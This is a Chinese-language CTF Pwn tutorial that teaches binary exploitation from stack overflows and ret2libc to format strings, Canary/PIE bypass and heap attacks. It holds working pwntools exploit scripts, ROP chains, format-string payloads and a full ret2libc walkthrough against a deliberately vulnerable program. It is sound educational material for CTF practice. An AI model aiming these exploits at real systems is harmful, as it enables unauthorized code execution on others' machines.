---
title: "Pwn 入门"
description: "CTF Pwn 方向入门手册：栈溢出、ret2text/shellcode/syscall/libc、ROP、格式化字符串、Canary/PIE、堆利用与内核方向。"
---

# Pwn 入门

> **让程序执行你想要的代码：从栈溢出到 getshell**

Pwn 是二进制漏洞利用：控制程序执行流，让它执行你想要的代码。本文从栈溢出、ret2libc 讲到格式化字符串、Canary/PIE 与堆利用，并给出完整的 ret2libc 演练。

## 第零章：Pwn 是什么

Pwn 是二进制漏洞利用：程序有内存破坏漏洞，你想办法控制它的执行流，让它执行 `system("/bin/sh")`，然后读 flag。

CTF Pwn 题的典型形态：

```text
nc chall.ctf.com 1337
```

给你一个远程服务，旁边附一个二进制文件和 libc。你要写 exp 打通它。

### 0.1 前置知识

| 知识 | 重要程度 | 说明 |
|------|----------|------|
| C 语言 | ★★★★★ | 指针、数组、字符串、内存布局 |
| 汇编 | ★★★★☆ | 函数调用、栈帧、寄存器 |
| Linux | ★★★★☆ | 进程、权限、shell、gcc/gdb |
| Python | ★★★★☆ | pwntools 写 exp |
| 数据结构 | ★★★☆☆ | 堆、链表 |

> 💡 **Pwn 的门槛比 Web/Misc 高**，但入门题的套路非常固定。先把栈溢出和 ret2libc 练熟，就能打不少题。

### 0.2 安全底线

只打 CTF 题目环境、自己搭的靶机、明确授权的目标。不要对真实服务器扫端口、打 exp。

---

## 第一章：环境搭建

### 1.1 推荐系统

- **Ubuntu 22.04 / 24.04**（虚拟机或 WSL2）。
- 安装基础工具：

```bash
sudo apt update
sudo apt install -y python3 python3-pip gcc gdb git patchelf netcat-openbsd
pip3 install pwntools
```

### 1.2 核心工具

| 工具 | 作用 | 安装 |
|------|------|------|
| pwntools | exp 框架 | `pip install pwntools` |
| pwndbg / GEF | GDB 增强 | 按官方脚本安装 |
| checksec | 看保护 | pwntools 自带 `pwn checksec` |
| ROPgadget | 找 gadget | `pip install ROPgadget` |
| ropper | 找 gadget | `pip install ropper` |
| one_gadget | 一键 getshell | `gem install one_gadget` |
| patchelf | 改 ELF 解释器/rpath | `apt install patchelf` |
| seccomp-tools | 看沙箱规则 | `gem install seccomp-tools` |
| libc-database | 查 libc 版本 | GitHub 克隆 |
| qemu-user | 跑 ARM/MIPS | `apt install qemu-user` |

### 1.3 用指定 libc 运行

题目给的 libc 和你本机不一致时：

```bash
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./pwn
./pwn
```

或者用：

```bash
./ld-linux-x86-64.so.2 --library-path . ./pwn
```

### 1.4 第一个 pwntools 脚本

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# 本地
p = process("./pwn")

# 远程
# p = remote("chall.ctf.com", 1337)

p.recvuntil(b"name: ")
p.sendline(b"hello")
print(p.recvall())
```

---

## 第二章：ELF 与保护机制

### 2.1 checksec

```bash
pwn checksec ./pwn
```

输出示例：

```text
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

### 2.2 五个保护

| 保护 | 含义 | 影响 |
|------|------|------|
| **NX** | 栈/堆不可执行 | 不能直接执行 shellcode，要 ROP |
| **PIE** | 代码段随机基址 | 不能写死函数地址，要先泄露 |
| **Canary** | 栈保护哨兵 | 溢出会先覆盖 canary，需要泄露或绕过 |
| **RELRO** | GOT 只读 | Full RELRO 下不能改 GOT |
| **FORTIFY** | 编译期检查 | 部分危险函数被替换 |

### 2.3 保护组合与思路

| 组合 | 常见打法 |
|------|----------|
| NX off | ret2shellcode |
| NX on, No PIE | ret2text、ret2libc |
| NX on, PIE on | 先泄露地址，再 ret2libc |
| Canary | 泄露 canary，或格式化字符串 |
| Full RELRO | 不能改 GOT，转向 `__free_hook`/`__malloc_hook`（老 glibc）或 FSOP |

### 2.4 PLT 与 GOT

```text
call puts@plt
   ↓
puts@plt: jmp [puts@got]
   ↓
puts@got: 运行时填入 libc 中 puts 的真实地址
```

第一次调用时，`puts@plt` 会跳转到动态链接器解析地址，之后 GOT 里就是真实地址。

> 💡 泄露 `puts@got` 的内容，就等于泄露 libc 中 `puts` 的地址；减去 libc 里的 `puts` 偏移，就得到 libc 基址。

---

## 第三章：栈与函数调用

### 3.1 栈的生长方向

栈从高地址向低地址生长。`push` 让 `rsp` 减小，`pop` 让 `rsp` 增大。

### 3.2 函数调用过程

```asm
; 调用者
mov rdi, arg1
call func
; 被调用者
func:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20
    ...
    leave
    ret
```

`call` 会把返回地址压栈，`ret` 会弹出返回地址并跳转。

### 3.3 栈帧图

```text
高地址
┌──────────────────┐
│ 调用者的栈        │
├──────────────────┤
│ 参数 7+           │
├──────────────────┤
│ 返回地址          │ ← 溢出目标
├──────────────────┤
│ 保存的 rbp        │ ← 溢出目标
├──────────────────┤
│ 局部变量 buf[64]  │ ← 写入起点
└──────────────────┘
低地址
```

缓冲区溢出时，写入超过 `buf` 大小的数据，会依次覆盖 rbp、返回地址。

### 3.4 偏移计算

```python
from pwn import *

payload = cyclic(200)
p = process("./pwn")
p.sendline(payload)
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
print(offset)
```

或者用 gdb：

```text
pwndbg> cyclic 200
pwndbg> run
pwndbg> cyclic -l 0x6161616c
```

> 💡 64 位程序覆盖返回地址时，注意栈对齐和 8 字节边界。

---

## 第四章：栈溢出基础

### 4.1 最简单的 ret2text

程序里已经有一个 `backdoor()` 函数：

```c
void backdoor() {
    system("/bin/sh");
}
```

溢出偏移是 72：

```python
from pwn import *

context.arch = "amd64"
p = process("./pwn")

payload = b"A" * 72 + p64(0x4011A9)
p.sendline(payload)
p.interactive()
```

> ⚠️ 如果 `system` 崩溃在 `movaps`，在返回地址前加一个 `ret` gadget 做栈对齐：
> `payload = b"A" * 72 + p64(ret) + p64(backdoor)`

### 4.2 找 backdoor 地址

```bash
objdump -d ./pwn | grep -A20 "<backdoor>"
```

或在 IDA/Ghidra 里看函数地址。

### 4.3 覆盖返回地址的细节

- 32 位：返回地址 4 字节。
- 64 位：返回地址 8 字节。
- 如果开了 canary，返回地址前还有 canary，不能直接覆盖。

### 4.4 栈上的参数

调用函数时，64 位前六个参数在寄存器：

```python
payload = b"A" * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

`pop rdi; ret` 可以用 ROPgadget 找：

```bash
ROPgadget --binary ./pwn --only "pop|ret" | grep "pop rdi"
```

---

## 第五章：ret2shellcode 与 ret2syscall

### 5.1 ret2shellcode

条件：

- NX 关闭（栈可执行）。
- 知道 shellcode 写入的地址（No PIE 或已泄露）。

```python
from pwn import *

context.arch = "amd64"
shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(offset, b"\x90") + p64(buf_addr)
p.sendline(payload)
p.interactive()
```

> 💡 现代题几乎都开 NX，ret2shellcode 更多出现在教学题。

### 5.2 ret2syscall

没有 `system`，但可以调用 `execve("/bin/sh", 0, 0)`：

```asm
rax = 59
rdi = "/bin/sh"
rsi = 0
rdx = 0
syscall
```

用 gadget 拼：

```bash
ROPgadget --binary ./pwn --only "pop|ret"
ROPgadget --binary ./pwn --only "syscall"
```

payload：

```python
payload = b"A" * offset
payload += p64(pop_rax_ret) + p64(59)
payload += p64(pop_rdi_ret) + p64(binsh_addr)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(syscall_ret)
```

### 5.3 ORW

沙箱禁用了 `execve` 时，只能 `open` + `read` + `write`：

```python
# open("/flag", 0)
# read(3, buf, 0x100)
# write(1, buf, 0x100)
```

用 ROP 拼三段 syscall，或用 pwntools 的 `shellcraft.open/read/write` 生成 shellcode（需要可执行内存）。

---

## 第六章：ret2libc

### 6.1 原理

NX 开启，不能执行 shellcode；但 libc 里有 `system` 和 `/bin/sh`。只要能算出 libc 基址，就能调用它们。

### 6.2 两阶段

**第一阶段：泄露 libc 地址**

```python
payload = b"A" * offset
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)
```

程序会执行 `puts(puts@got)`，把 `puts` 的真实地址打印出来，然后回到 `main` 再来一次。

**第二阶段：调用 system**

```python
libc_base = leaked_puts - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload = b"A" * offset
payload += p64(ret)          # 栈对齐
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)
```

### 6.3 完整脚本

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./pwn")
libc = ELF("./libc.so.6")

p = process("./pwn")
# p = remote("chall.ctf.com", 1337)

pop_rdi = 0x4011f3
ret = 0x40101a

offset = 72

# 泄露 puts
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])
p.sendlineafter(b"name: ", payload)

leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = leaked - libc.symbols["puts"]
log.success(f"libc base: {hex(libc_base)}")

system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload = b"A" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendlineafter(b"name: ", payload)

p.interactive()
```

### 6.4 没有 libc 文件怎么办

用 libc-database 根据泄露的地址低位查：

```bash
./find puts 0x7f1234567890
```

它会列出匹配的 libc 版本，再下载对应文件。

### 6.5 one_gadget

如果不想拼 `system("/bin/sh")`，可以直接跳到 libc 里的 one_gadget：

```bash
one_gadget ./libc.so.6
```

输出类似：

```text
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
```

满足约束就能拿 shell。约束不满足时，可以调栈或先 ROP 一下。

---

## 第七章：ROP 进阶

### 7.1 ret2csu

64 位程序里找不到 `pop rdx` 时，可以用 `__libc_csu_init` 里的通用 gadget：

```asm
; gadget 1
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; gadget 2
mov rdx, r14
mov rsi, r13
mov edi, r12d
call qword ptr [r15 + rbx*8]
```

pwntools 有现成构造：

```python
rop = ROP(elf)
rop.ret2csu(edi=..., rsi=..., rdx=...)
```

### 7.2 SROP

`sigreturn` 可以一次性恢复所有寄存器。条件是能控制 `rax=15` 并触发 `syscall`。

```python
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
```

### 7.3 gadget 不够用

- 用 `ROPgadget --binary ./pwn --all` 找更多。
- 用 libc 里的 gadget（先泄露 libc）。
- 用 `ret2dlresolve`（不需要 libc 泄露）。
- 用 `ret2csu` + `syscall`。

---

## 第八章：格式化字符串

### 8.1 原理

```c
printf(user_input);
```

用户输入被当成格式串：

```text
%p   打印栈上的值（指针）
%s   把栈上的值当地址，打印该地址的字符串
%n   把已输出字符数写入栈上的地址
```

### 8.2 泄露

```python
p.sendline(b"%p.%p.%p.%p.%p.%p")
print(p.recvline())
```

找到输入在栈上的位置（第几个 `%p` 对应你的缓冲区）。

### 8.3 任意读

```python
# 假设第 6 个参数是输入
payload = p64(target_addr) + b"%6$s"
```

### 8.4 任意写

```python
# 把 value 写到 target_addr
payload = fmtstr_payload(6, {target_addr: value})
p.sendline(payload)
```

`fmtstr_payload` 会自动处理 `%n`、字节数、地址对齐。

### 8.5 常见目标

- 改 GOT 表（Partial RELRO）。
- 改返回地址。
- 改 `__malloc_hook`、`__free_hook`（glibc < 2.34）。
- 改栈上的变量。

---

## 第九章：Canary 与 PIE

### 9.1 Canary 是什么

函数开头从 `fs:0x28` 取一个随机值放到栈上，返回前检查是否被改。Canary 的最低位通常是 `\x00`，防止字符串函数直接泄露。

### 9.2 泄露 Canary

- 格式化字符串：`%p` 打印栈上的 canary。
- `puts` 打印缓冲区时，如果缓冲区刚好覆盖到 canary，可能泄露出 `\x00` 后面的字节。
- 逐字节爆破（fork 进程的 canary 不变）。

### 9.3 PIE

PIE 开启后，代码段基址随机。需要：

1. 泄露一个代码地址（如 `main`、`puts@plt`）。
2. 计算基址。
3. 所有 gadget 地址加上基址。

部分覆盖（partial overwrite）也是常用技巧：只改返回地址的低 1-2 字节，保持高位不变。

### 9.4 爆破

fork 型程序（每次连接 fork 一个子进程）canary 和 PIE 基址可能不变，可以逐字节爆破：

```python
canary = b"\x00"
for i in range(7):
    for guess in range(256):
        payload = b"A" * offset + canary + bytes([guess])
        ...
```

---

## 第十章：堆基础

### 10.1 chunk 结构

```text
┌──────────────┬──────────────┬──────────────┬──────────────┐
│ prev_size    │ size         │ user data    │ ...          │
└──────────────┴──────────────┴──────────────┴──────────────┘
```

- `size` 的低 3 位是标志位：`PREV_INUSE`、`IS_MMAPPED`、`NON_MAIN_ARENA`。
- 实际 chunk 大小按 16 字节对齐。
- 用户数据从 `chunk + 0x10` 开始。

### 10.2 tcache

glibc 2.26 引入 tcache（thread cache）：

- 每个大小类最多缓存 7 个 chunk。
- 单向链表，`fd` 指向下一个 chunk。
- 分配/释放都优先走 tcache。

### 10.3 UAF

Use-After-Free：释放后仍然使用指针。

```c
char *p = malloc(0x40);
free(p);
strcpy(p, "data");   // UAF，写入已释放的 chunk
```

如果释放后 chunk 被重新分配，写入就会影响新对象。

### 10.4 double free

重复释放同一个 chunk，导致 tcache 链表出现环：

```c
free(p);
free(p);   // double free
```

glibc 有检查（tcache 会检查 key），但可以通过 UAF 改 key 绕过。

### 10.5 tcache poisoning

把 tcache 的 `fd` 改成目标地址，下一次分配就会返回目标地址：

```python
# 假设 chunk A 已释放，fd 在 user data 开头
payload = p64(target_addr)
edit(chunk_A, payload)

malloc()   # 返回 A
malloc()   # 返回 target_addr
```

### 10.6 safe-linking

glibc 2.32 起，tcache/fastbin 的 `fd` 被混淆：

```text
stored = (pos >> 12) ^ ptr
```

`pos` 是 `fd` 字段自身的地址。要伪造指针，需要先泄露堆地址：

```python
stored = (pos >> 12) ^ target
```

### 10.7 glibc 版本差异

| 版本 | 变化 |
|------|------|
| 2.26 | 引入 tcache |
| 2.29 | tcache double free 检查增强 |
| 2.32 | 引入 safe-linking |
| 2.34 | 移除 `__malloc_hook` / `__free_hook` |
| 2.35+ | 更多堆检查，FSOP 成为主流 |

> 💡 做题先看 libc 版本。`strings libc.so.6 | grep "GNU C Library"` 或 `./libc.so.6` 都能看。

### 10.8 常见堆题类型

| 类型 | 特征 |
|------|------|
| UAF | 释放后仍可编辑 |
| double free | 可重复释放 |
| off-by-one | 多写一个字节，改相邻 chunk 的 size |
| overlap | 重叠 chunk，改元数据 |
| tcache poisoning | 改 fd 指针 |
| large bin attack | 改 bk/bk_nextsize |
| FSOP | 攻击 `_IO_FILE` 结构 |

---

## 第十一章：高级方向

### 11.1 内核 Pwn

题目给一个内核模块（`.ko`）和 `run.sh`（qemu 启动脚本）。

常见漏洞：

- `ioctl` 越界读写。
- 栈溢出。
- UAF。

利用目标：

- `commit_creds(prepare_kernel_cred(NULL))` 提权。
- 改 `modprobe_path`。
- 改 `core_pattern`。

保护：

- KASLR：内核基址随机。
- SMEP：内核不能执行用户页。
- SMAP：内核不能访问用户页。
- KPTI：页表隔离。

工具：`vmlinux`、`extract-vmlinux`、`ropper`、`gdb` + `gef`。

### 11.2 沙箱与 ORW

`seccomp-tools dump ./pwn` 看允许的 syscall。如果禁了 `execve`，就只能 ORW。

### 11.3 其他架构

- ARM/MIPS：用 `qemu-arm` / `qemu-mips` 跑，gdb-multiarch 调试。
- Windows Pwn：少见于 CTF，主要考栈溢出 + ROP + DEP/ASLR 绕过。

---

## 第十二章：远程打靶与脚本模板

### 12.1 交互流程

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./pwn")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("chall.ctf.com", 1337)
    return process("./pwn")

p = start()
p.recvuntil(b"name: ")
p.sendline(payload)
p.interactive()
```

### 12.2 常用接收函数

```python
p.recv(1024)              # 接收指定字节
p.recvline()              # 接收一行
p.recvuntil(b"prompt")    # 接收到指定字符串
p.recvlines(3)            # 接收多行
p.send(b"data")           # 发送
p.sendline(b"data")       # 发送并换行
p.sendafter(b"prompt", b"data")
p.sendlineafter(b"prompt", b"data")
p.interactive()           # 进入交互
```

### 12.3 拿到 shell 后

```python
p.interactive()
# 然后手动输入：
# cat /flag
# ls -la
# cat flag.txt
```

也可以自动：

```python
p.sendline(b"cat /flag")
print(p.recvall())
```

### 12.4 常见坑

| 问题 | 解决 |
|------|------|
| 收到乱码 | 用 `recvuntil` 对齐，不要盲 `recvline` |
| 脚本卡住 | 加 `timeout`，检查是否少发了换行 |
| 本地通远程不通 | libc 版本不同，换题目给的 libc |
| `system` 崩溃 | 加 `ret` 做栈对齐 |
| 地址不对 | 确认 PIE、确认泄露值、确认偏移 |

---

## 第十三章：工具链与学习路线

### 13.1 工具速查

| 场景 | 工具 |
|------|------|
| 看保护 | checksec |
| 找 gadget | ROPgadget、ropper |
| 一键 getshell | one_gadget |
| 查 libc | libc-database |
| 改 libc 路径 | patchelf |
| 看沙箱 | seccomp-tools |
| 调试 | gdb + pwndbg/GEF |
| 写 exp | pwntools |
| 反编译 | IDA、Ghidra |
| 内核 | qemu、vmlinux、extract-vmlinux |

### 13.2 学习路线

```text
C + 汇编 + Linux 基础
   ↓
栈溢出 + ret2text
   ↓
ret2shellcode + ret2syscall
   ↓
ret2libc + ROP
   ↓
格式化字符串
   ↓
Canary + PIE
   ↓
堆：UAF、double free、tcache
   ↓
FSOP / 内核 / 沙箱
```

### 13.3 推荐靶场

- **pwn.college**：系统化课程，从汇编到内核。
- **picoCTF Binary Exploitation**：基础题友好。
- **BUUCTF Pwn**：国内题多。
- **NSSCTF Pwn**：比赛题复现。
- **how2heap**：堆利用示例集合。
- **CTF Wiki Pwn**：中文系统资料。

### 13.4 WP 模板

```markdown
## 题目信息
- 名称：
- 保护：NX / PIE / Canary / RELRO
- libc 版本：

## 漏洞分析
1. 反编译：
2. 漏洞点：
3. 利用思路：

## exp
（贴脚本）

## 知识点总结
- 
```

---

## 附录 A：pwntools 常用 API

```python
from pwn import *

# 上下文
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# 目标
p = process("./pwn")
p = remote("host", 1337)

# 交互
p.recvuntil(b"x")
p.sendline(b"x")
p.interactive()

# ELF
elf = ELF("./pwn")
elf.symbols["main"]
elf.got["puts"]
elf.plt["puts"]

# 打包
p64(0x401234)
u64(b"\x00" * 8)
p32(0x08048400)
u32(b"\x00" * 4)

# 偏移
cyclic(100)
cyclic_find(0x6161616c)

# ROP
rop = ROP(elf)
rop.call("puts", [elf.got["puts"]])
rop.chain()
```

## 附录 B：checksec 保护速查

```text
NX enabled        → 不能执行栈上代码
PIE enabled       → 代码地址随机，需要泄露
Canary found      → 栈上有哨兵，需要泄露/绕过
Full RELRO        → GOT 只读
Partial RELRO     → GOT 可写（可打 GOT）
No PIE            → 地址固定，可直接写 gadget 地址
```

## 附录 C：参考资料

- CTF Wiki Pwn：<https://ctf-wiki.org/pwn/>
- pwntools 文档：<https://docs.pwntools.com/>
- how2heap：<https://github.com/shellphish/how2heap>
- libc-database：<https://github.com/niklasb/libc-database>
- one_gadget：<https://github.com/david942j/one_gadget>
- ROPgadget：<https://github.com/JonathanSalwan/ROPgadget>
- pwn.college：<https://pwn.college/>

---

> 📌 **最后一句：** Pwn 的 exp 是“一步一步把程序骗到你想去的地方”。先把偏移算对、把泄露打通、把 `system("/bin/sh")` 调通，剩下的都是重复这套流程。

---

## 附录 D：新手 14 天练习计划

| 天数 | 任务 | 目标 |
|------|------|------|
| 第 1 天 | 装 Ubuntu + pwntools + pwndbg | 能跑 `checksec` |
| 第 2 天 | ELF/PLT/GOT | 能解释一次函数调用 |
| 第 3 天 | 栈帧 + 调用约定 | 能画栈帧图 |
| 第 4 天 | 栈溢出 + 偏移 | 能算 offset |
| 第 5 天 | ret2text | 能跳 backdoor |
| 第 6 天 | ret2shellcode | 能执行 shellcode |
| 第 7 天 | ret2syscall | 能拼 execve |
| 第 8 天 | ret2libc 泄露 | 能算 libc base |
| 第 9 天 | ret2libc getshell | 能打通本地 |
| 第 10 天 | 格式化字符串 | 能任意读写 |
| 第 11 天 | Canary/PIE | 能泄露/爆破 |
| 第 12 天 | 堆 UAF/double free | 能看懂 chunk |
| 第 13 天 | tcache poisoning | 能改 fd 拿 shell |
| 第 14 天 | BUUCTF Pwn 5 题 | 完整写 exp |

---

## 附录 E：完整演练：ret2libc 从 0 到 shell

### E.1 题目代码

```c
#include <stdio.h>

void vuln() {
    char buf[64];
    puts("name:");
    gets(buf);
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    vuln();
    return 0;
}
```

编译：

```bash
gcc -fno-stack-protector -no-pie -o pwn pwn.c
```

> ⚠️ `gets` 在新编译器里可能被移除，可以用 `fgets` + 手动去掉换行，或 `-Wno-implicit-function-declaration`。CTF 题通常直接给二进制，不用自己编译。

### E.2 第一步：看保护

```bash
pwn checksec ./pwn
```

输出：

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

结论：

- NX 开启 → 不能执行栈上 shellcode。
- No PIE → gadget 地址固定。
- No canary → 可以直接覆盖返回地址。

### E.3 第二步：算偏移

```bash
gdb ./pwn
```

```text
pwndbg> cyclic 200
pwndbg> run
name:
aaaabaaacaaadaaaeaaaf...
pwndbg> cyclic -l 0x6161616c
72
```

偏移是 72。

### E.4 第三步：找 gadget

```bash
ROPgadget --binary ./pwn --only "pop|ret" | grep "pop rdi"
# 0x00000000004011f3 : pop rdi ; ret

ROPgadget --binary ./pwn --only "ret"
# 0x000000000040101a : ret
```

`ret` 用来做栈对齐，避免 `system` 里的 `movaps` 崩溃。

### E.5 第四步：泄露 puts

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process("./pwn")

pop_rdi = 0x4011f3
ret = 0x40101a
offset = 72

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

p.recvuntil(b"name:\n")
p.sendline(payload)

leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
log.success(f"puts: {hex(leaked)}")
```

运行后得到类似：

```text
[+] puts: 0x7f8e3c4a2ed0
```

### E.6 第五步：算 libc 基址

```python
libc_base = leaked - libc.symbols["puts"]
log.success(f"libc base: {hex(libc_base)}")
```

如果本机 libc 和题目不一致，用题目给的 libc，或 libc-database 查。

### E.7 第六步：调用 system

```python
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload = b"A" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.recvuntil(b"name:\n")
p.sendline(payload)
p.interactive()
```

### E.8 第七步：验证

```text
$ whoami
your-user
$ cat /flag
flag{ret2libc_works}
```

### E.9 第八步：远程

```python
p = remote("chall.ctf.com", 1337)
```

其他代码不变。注意远程 libc 可能不同，泄露后先用 libc-database 确认。

### E.10 你学到了什么

- `checksec` 判断保护。
- `cyclic` 算偏移。
- `pop rdi; ret` 传参。
- GOT 泄露 libc。
- `ret` 栈对齐。
- `system("/bin/sh")`。

---

## 附录 F：常见报错与解决

| 现象 | 原因 | 解决 |
|------|------|------|
| `system` 崩溃在 `movaps` | 栈未 16 字节对齐 | 在返回地址前加一个 `ret` |
| 泄露值是 `0x0`/乱码 | 接收错位/没泄露到 | 用 `recvuntil` 对齐，检查 payload |
| `EOFError` | 程序提前退出 | 检查偏移、检查是否覆盖了 canary |
| 本地通远程不通 | libc 不同 | 用题目 libc，或 libc-database |
| `Address already in use` | 端口占用 | 换端口，或关掉旧进程 |
| `SIGSEGV` 在 `pop rdi` | gadget 地址错/PIE | 确认基址，重新找 gadget |
| 格式化字符串写不进去 | 偏移错/地址含 `\x00` | 用 `fmtstr_payload`，把地址放末尾 |
| tcache 分配不到目标 | safe-linking | 先泄露堆地址，计算 `(pos>>12)^target` |
| `__free_hook` 不存在 | glibc ≥ 2.34 | 改用 FSOP 或其他目标 |
| `patchelf` 后跑不起来 | 解释器/库路径错 | 检查 `ldd`，用 `--set-rpath` |

---

## 附录 G：术语表

| 术语 | 解释 |
|------|------|
| Pwn | 二进制漏洞利用 |
| EXP | 利用脚本 |
| Shellcode | 一段可执行的机器码 |
| ROP | 返回导向编程 |
| Gadget | 以 `ret` 结尾的指令片段 |
| ret2text | 返回到程序已有代码 |
| ret2libc | 返回到 libc 函数 |
| ret2syscall | 通过 syscall 执行 |
| ret2csu | 利用 `__libc_csu_init` 的 gadget |
| SROP | 信号返回导向编程 |
| GOT/PLT | 全局偏移表/过程链接表 |
| Canary | 栈保护哨兵 |
| PIE | 位置无关可执行文件 |
| NX | 不可执行栈/堆 |
| RELRO | 重定位只读 |
| ASLR | 地址空间随机化 |
| tcache | 线程缓存 |
| UAF | 释放后使用 |
| Double Free | 重复释放 |
| Safe-linking | glibc 指针混淆 |
| FSOP | 文件流导向编程 |
| ORW | open/read/write |
| seccomp | 系统调用过滤 |
